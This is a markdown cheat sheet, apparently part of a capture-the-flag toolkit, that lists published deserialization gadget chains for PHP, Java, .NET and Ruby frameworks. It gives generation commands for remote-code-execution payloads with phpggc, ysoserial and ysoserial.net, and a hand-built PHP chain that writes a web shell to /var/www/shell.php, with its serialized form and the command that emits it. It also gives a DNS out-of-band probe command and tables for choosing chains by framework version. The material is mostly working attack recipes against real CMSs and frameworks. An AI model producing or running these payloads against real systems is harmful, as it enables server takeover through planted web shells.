# Real-World Chains — CMS/framework chain recipes worth memorizing

## The point — CTF deser challenges reuse real-world gadget chains

Most CTF deserialization challenges aren't bespoke — they wrap a published
chain (phpggc, ysoserial, ysoserial.net) in a thin challenge. Knowing the
*real* chains by name short-circuits the gadget search.

## PHP — phpggc chains by target

```bash
# the generator is phpggc (absent in this tree — build the string by hand
# or fetch it on a networked box); the chain names are the vocabulary:
phpggc -l                          # list all chains
phpggc -l Symfony                  # chains for a specific framework
phpggc Symfony/RCE4 exec 'id'      # generate
```

Chains that appear in CTF most often:

| Framework | Chain | Sink | Why it's used |
|---|---|---|---|
| Laravel | Laravel/RCE1 | `system` | PendingChain → eval |
| Laravel | Laravel/RCE5 | file write | log-file write |
| Symfony | Symfony/RCE1 | `system` | GenericHttpClient |
| Symfony | Symfony/FW1 | file write | FileResource |
| Drupal | Drupal7/RCE1 | `assert` | CacheRouterRebuildTask |
| WordPress | WordPress/Guzzle/RCE1 | `system` | needs Guzzle dep |
| Magento | Magento/SQL1 | file write | SQL write → webshell |
| Slim | Slim/RCE1 | `exec` | RenderableWrapper |
| Zend | ZendFramework/RCE1-4 | code | various |
| Generic | Generic | file write | `__destruct` unlink/file_put_contents |

## The "build the string without phpggc" recipe

phpggc emits a PHP serialize stream. The chain is a nested object graph —
read the phpggc source for the chain's class tree, then emit it with
`tools/php_ser_gen.py --spec` or by hand:

```php
// a minimal __destruct file-write chain (generic shape):
class FileWriter {
    public $filename = '/var/www/shell.php';
    public $data = '<?php system($_GET["c"]); ?>';
    public function __destruct() { file_put_contents($this->filename, $this->data); }
}
// the serialized form:
// O:10:"FileWriter":2:{s:8:"filename";s:19:"/var/www/shell.php";s:4:"data";s:28:"<?php system($_GET[\"c\"]); ?>";}
```

Emit it:

```bash
python3 tools/php_ser_gen.py --spec '{"O":"FileWriter","props":{"filename":"/var/www/shell.php","data":"<?php system($_GET[\\"c\\"]); ?>"}}'
```

## Java — ysoserial chains by classpath

```bash
java -jar ysoserial.jar 'CommonsCollections1' 'id'     # generate
java -jar ysoserial.jar 'URLDNS' 'http://x.oob.tld'    # the blind probe
```

Chains by required lib (the lockfile/pom.xml picks):

| Lib on classpath | Chains | Sink |
|---|---|---|
| commons-collections | CC1-7 | Runtime.exec |
| commons-collections4 | CC1,3,4 | Runtime.exec |
| commons-beanutils | BeanShell1, CB1 | Runtime.exec |
| groovy | Groovy1 | Runtime.exec |
| spring | Spring1-2 | JNDI/RCE |
| hibernate | Hibernate1-2 | JNDI |
| jboss | JBossInterceptors1 | exec |
| jdk-only (none) | URLDNS | DNS resolve — blind probe |
| jdk-only | JRMPClient | connect-back |
| clojure | Clojure | exec |

**URLDNS** needs NOTHING — it's the safest blind SSFR/deser probe: embed a
`URL` object whose `hashCode` triggers a DNS lookup on deserialize.

## .NET — ysoserial.net chains by target

```bash
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "id"
ysoserial.exe -f Json.NET -g TypeConfuseDelegate -o raw -c "id"
ysoserial.exe -l                          # list gadgets
ysoserial.exe -f LosFormatter -g TypeConfuseDelegate --modifier
```

| Formatter | Gadgets | Notes |
|---|---|---|
| BinaryFormatter | TypeConfuseDelegate, WindowsIdentity, ActivitySurrogateSelector | the classic |
| LosFormatter | TypeConfuseDelegate | ViewState w/o MAC |
| Json.NET | TypeConfuseDelegate, ClaimsPrincipal | needs TypeNameHandling |
| SoapFormatter | ActivitySurrogateSelectorFromFile | |
| DataContractSerializer | TypeConfuseDelegate | |
| ObjectStateFormatter | TypeConfuseDelegate | |
| XmlSerializer | (code-gen chain) | sgen-limited |

## Ruby — the two canonical chains

- **ERB chain** — `!ruby/object:ERB` with `src: os.system(...)` → renders
  on `.result` — `ruby-deser.md`
- **Marshal flag-chain** — a custom class with `marshal_load` reading the
  flag → `ctf-recipes.md`

## The "which chain fits the version" table

```
Laravel 5.x    → Laravel/RCE1-8 (depends on illuminate/support ver)
Symfony 3.x    → Symfony/RCE1-4
Symfony 5.x    → Symfony/RCE9+ (modern chains)
WordPress core → needs a plugin/lib on top of core
Drupal 7       → Drupal7/RCE1
Drupal 8       → Drupal8/RCE1
commons-coll 3.x → CC1-7 / commons-coll4 4.x → CC1,3,4
spring-core     → Spring1, Spring2
```

The version picks — `composer.lock`/`pom.xml`/`Gemfile.lock` is the answer.

## Falsifiers

- the named chain's lib isn't on the classpath → a different chain is needed
- the class name is wrong for the app's version → a different chain
- the app validates the serialized stream's top-level type → bypass is a
  different problem
- the deserialize calls `allowed_classes`/Binder that excludes the gadget
  class → no chain will reach it

## Output to record

- The chain name + lib version it needs + the sink it reaches
- The emitted payload's verbatim form + the proof it fired
